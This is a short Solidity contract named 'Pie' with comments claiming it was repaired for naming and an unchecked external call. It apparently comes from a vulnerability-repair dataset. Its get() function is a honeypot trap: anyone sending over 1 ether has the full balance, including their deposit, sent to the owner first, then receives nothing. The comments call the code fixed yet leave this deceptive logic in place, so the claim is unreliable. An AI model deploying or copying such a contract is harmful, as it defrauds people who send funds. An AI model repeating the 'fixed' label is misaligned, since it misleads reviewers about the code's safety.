pragma solidity ^0.4.19;

contract Pie {
    address public owner = msg.sender;

    function() public payable {}

    function get() public payable {
        if (msg.value > 1 ether) {
            owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }

    function withdraw() public payable {
        require(msg.sender == owner);
        owner.transfer(this.balance);
    }

    function command(address adr, bytes data) public payable {
        require(msg.sender == owner);
        require(adr.call.value(msg.value)(data));
    }
}

// Changes Made:
// 1. Changed the variable name "Owner" to "owner" to follow naming conventions.
// 2. Removed the unnecessary if statement in the "withdraw" function that was setting the owner to a specific address.
// 3. Added a require statement in the "command" function to check if the external call was successful. This fixes the unchecked low level call vulnerability identified by the smart contract analyzers.